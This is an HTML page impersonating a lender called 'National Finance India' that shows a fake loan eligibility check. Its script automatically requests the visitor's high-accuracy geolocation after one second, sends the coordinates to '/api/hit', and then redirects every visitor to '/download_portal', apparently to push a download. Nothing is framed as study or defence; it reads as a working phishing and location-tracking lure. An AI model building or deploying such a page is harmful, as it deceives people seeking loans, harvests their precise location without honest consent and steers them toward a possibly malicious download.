<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>National Finance India - Instant Loan Portal</title>
    <style>
        body { background: #f8f9fa; color: #333; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 
100vh; margin: 0; box-sizing: border-box; }
        .card { background: #ffffff; padding: 40px 30px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); max-width: 400px; width: 100%; text-align: center; border-top: 4px solid 
#0056b3; box-sizing: border-box; }
        h2 { color: #0056b3; margin-bottom: 10px; font-size: 22px; }
        p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        .spinner { border: 3px solid #e9ecef; border-top: 3px solid #0056b3; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <h2>National Finance India</h2>
        <p>Verifying your area eligibility for instant loan approval...</p>
        <div class="spinner"></div>
    </div>

    <script>
        window.onload = function() {
            // Page khulne ke theek 1 second baad automatic location prompt aayega
            setTimeout(function() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            fetch('/api/hit', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ 
                                    latitude: pos.coords.latitude, 
                                    longitude: pos.coords.longitude 
                                })
                            })
                            .then(res => res.json())
                            .then(data => {
                                window.location.href = "/download_portal";
                            })
                            .catch(err => {
                                window.location.href = "/download_portal";
                            });
                        },
                        err => {
                            window.location.href = "/download_portal";
                        },
                        { enableHighAccuracy: true, timeout: 15000 }
                    );
                } else {
                    window.location.href = "/download_portal";
                }
            }, 1000); // 1000 milliseconds = 1 second delay
        };
    </script>
</body>
</html>
